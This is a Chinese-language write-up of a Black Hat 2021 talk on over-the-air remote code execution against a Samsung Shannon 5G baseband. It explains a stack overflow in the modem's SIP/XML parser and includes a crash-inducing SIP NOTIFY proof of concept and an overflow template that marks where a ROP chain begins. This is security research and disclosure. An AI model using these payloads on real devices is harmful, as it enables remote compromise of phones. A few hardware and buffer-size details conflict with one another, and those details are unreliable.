# “入侵5G手机”（一）Black Hat USA 2021：通过无线基带-针对5G智能手机的RCE远程代码执行攻击白皮书
> 白羽·
> 来源：https://www.iotsec-zone.com/article/93

# **研究5G网络安全的背景：**

近年来，我们看到5G网络被广泛采用，包括消费设备、物联网和关键基础设施。
对连接到5G网络的设备数量的估计各不相同，但统计数据显示，这些设备在市场上占有很大的份额。
为了加入5G网络，每一个设备都必须配备5G调制解调器（5G modem），负责调制信号和实施无线电协议。该组件通常也称为基带。
保护这些组件的安全非常重要，因为它们处理来自无线网络的不可信数据，这使得它们对远程攻击者特别有吸引力。
在我们之前的工作中，我们检查了上一代网络（如2G、3G或4G）的安全调制解调器，并实现了RCE攻击。
本文将探讨5G网络发生了哪些变化，在安全方面有哪些改进，哪些没有。此次将演示在新一代5G智能手机上完成RCE是有可能的。
近些年来5G网络安全是完全没有被设计到的领域，白皮书提供了两篇文章供作为背景知识参考：

1. Huawei modem remote code execution
2. pwn2own Amat Cama work on Samsung Shannon

## **研究准备方法：**

### 寻找目标：

购买了市面上的不同5G智能手机

### 攻击范围：

完成一次RCE攻击

### 漏洞挖掘范围：

不访问任何商业5G基站的情况下触发漏洞

### 5G设备的区别：

非独立模式（NSA）：该模式结合了新的5G信号，并利用了4G网络的其他组件。
独立模式（SA）：该模式完全实现并使用5G新无线信号与5G网络协议。

### 测试手机型号：

Vivo S6 5G手机 SA模板 骁龙980 三星Shannon基带
![0.png](https://www.iotsec-zone.com/images/MdImg/d6e52ad3318b75728fd1d34690bf15b0.webp)
![1.png](https://www.iotsec-zone.com/images/MdImg/d824b4f67d2c63f3e32e59755801b639.webp)
![2.png](https://www.iotsec-zone.com/images/MdImg/ffb3b92938421074d9f178cbad0df9db.webp)

### 审计范围与漏洞挖掘

在审计过程中发现了stack cookie缓解保护又称为Stack Canary，这是一种经典的缓冲区溢出的保护机制.
Stack Cannary通过在栈中设置标识检查输入的数据是否破坏栈，只要绕过Stack Cannary保护就能完成攻击。
在5G设备中仍然会出现“栈溢出”这种低级毛病，最有趣的不是栈溢出环节，而是分析基带中的XML程序，XML解析器负责解析从网络到设备调制解调器的IMS消息。
其中，在5G与4G通信中会通过IMS建立联系,基带就是IMS的客户端，它会处理VoLTE与VoNR信息，所以一定会传输有关SIP的信息,IMS服务端通过SIP信息与modem进行数据传输。
IMS是4G和5G网络的首选架构，在其上构建交互式呼叫，我们稍后将了解这对本研究的重要性。
基带它是一个IMS客户端，负责处理VOLT、VoNR消息，因此它必须能够处理SIP消息，IMS服务器使用SIP消息与调制解调器通信。
下面是message示例：

![3.png](https://www.iotsec-zone.com/images/MdImg/d6568c3a55cbb9776c447ae477752bc3.webp)
SIP是一种基于文本、类似HTTP的协议，包括头和内容。接收器（在本例中为基带）需要解析来自服务器的消息。

### 漏洞

我们的OTA远程代码执行错误位于基带的IMS部分。解析SIP协议消息的XML内容时，它将调用函数IMSPL_XmlGetNextTagName
这个调制解调器没有调试符号或信息，因此所有函数名、类型和函数签名都可以从日志字符串手动恢复，也可以通过反向工程恢复。这个函数将解析src中的XML标记，并将其名称复制到dst，例如，把“meta”复制到缓冲区中。

```
<meta name=“viewport”content=“width=device width，initial scale=1”>
```


![4.png](https://www.iotsec-zone.com/images/MdImg/9bc25e944b19452229279c6287720386.webp)
下面这个函数在寻找结束标志跳过一些特殊字符如：’/’’>’?’
![5.png](https://www.iotsec-zone.com/images/MdImg/cf95ef29227695ef55c0299e1389e370.webp)
函数没有做任何安全检测，可以完成任意call与缓冲区溢出。
通过IMSPL_XmlGetNextTagName我们寻找到有许多可以进行call的地方,由于缓冲区是从OTA消息中提取的，因此它们中的大多数都易受攻击。
我们选择栈溢出是可靠的，没有stack canary 保护，因此我们可以简单地完成缓冲区溢出，控制存储在栈上的返回地址，并执行我们的shellcode。
这是溢出的函数IMSPL_XmlParser_ContactLstDecode
![6.png](https://www.iotsec-zone.com/images/MdImg/3c43855a275bf4f0018d3e377e5e259f.png)
当我们观察到char v11[136]; v11变量在栈上有100byte大小的缓冲区可以溢出
我们同样找到了相似的函数IMSPL_XmlParser_RegLstDecode
IMSPL_XmlParser_ContElemChildNodeDecode 等。
根据以上函数的名字我们可以推测，我们可以完成一次ROP链攻击
MSPL_XmlParser_RegInfoDecode -> IMSPL_XmlParser_RegInfoElemDecode ->
IMSPL_XmlParser_RegLstDecode->
IMSPL_XmlParser_RegistratonElemDecode->
IMSPL_XmlParser_ContactLstDecode
如果payload通过SIP协议中的NOTIFY信息发送，可以造成基带崩溃。由于函数find_tag_end里面对一些字符的黑名单，
“\x00\x09\x0a\x0d\x20\x2f\x3e\x3f”，所以我们在构建ROP链
不能利用有用的gadgets
下面是使基带崩溃的POC不能完成攻击

```
NOTIFY  sip:404456666666666@192.168.101.2:5060  SIP/2.0
  Via:  SIP/2.0/TCP  172.18.0.12;branch=z9hG4bK5829.b8e4601b3f6e281818a8a878daee5112.0
  Via:  SIP/2.0/UDP
172.18.0.14:6060;branch=z9hG4bK5829.c1534326000000000000000000000000.0
  To:  <sip:666666>;tag=31f5ed9f
  From:  <sip:@666666>;tag=facfaba04ffdc638bb119e5faba08da6-3a20000
  CSeq:  4  NOTIFY
  Call-ID:  85bcaa29686a87fe@192.168.101.2
  Content-Length:  1719
  User-Agent:  Kamailio  S-CSCF
  Contact:  <sip:scscf.ims.mnc045.mcc404.3gppnetwork.org:6060>
  Event:  reg
Max-Forwards:  69
  Subscription-State:  active;expires=600000
  Content-Type:  application/reginfo+xml
  <?xml  version=”1.0”?>
  <reginfo  xmlns=”urn:ietf:params:xml:ns:reginfo”  version=”2”  state=”full”>
  <registration  aor=”tel:666666”  id=”0x7f970dea8570”  state=”active”>
  <contact  id=”0x7f970dea7710”  state=”active”  event=”registered”  expires=”599996” q=”0.000”>  <uri>sip:404456666666666@192.168.101.2:5060;alias=192.168.101.2~49214~2</uri>
  <unknown-param
name=”+sip.instance”>”&lt;urn:gsma:imei:86044804-970539-0&gt;”</unknown-param>
  <unknown-param  name=”+g.3gpp.smsip”></unknown-param>
  <unknown-param  name=”video”></unknown-param>  <unknown-param  name=”+g.3gpp.icsi-ref”>”urn%3Aurn-7%3A3gpp-service.ims.icsi.mmtel ”</unknown-param>
  </contact>
  </registration>
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA  ⌋   AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA         AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA ⌋  payload</AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA ⌋       AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA ⌋          AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA ⌋
</reginfo>
```

在ROP链执行以后，基带仍然是完好无损的，我们可以更换一个更好的位置进行溢出，例如标签

```
<?xml  version=”1.0”?>
  <reginfo  xmlns=”urn:ietf:params:xml:ns:reginfo”  version=”2”  state=”full”>
  <registration  aor=”tel:666666”  id=”0x7fe072423570”  state=”active”>
  <contact  id=”0x7fe072422710”  state=”active”  event=”registered”  expires=”599996” q=”0.000”>
AAAAAAAAAAAAAAAAAAAAAA1ABC2ABC3ABC4ABC5ABC6ABC7ABC8ABCRop-chain-starts-here>test</haha
  </contact>
  </registration>
  </reginfo>
```

Payload的结构如下：
![7.png](https://www.iotsec-zone.com/images/MdImg/1335f58629efe082c981336c43330a28.webp)
在栈上Payload是从100byte的’A’开始，紧接着栈上保存了R4-R11。真正的ROP链是为了从栈上复制shellcode然后执行shellcode
（未完待续）
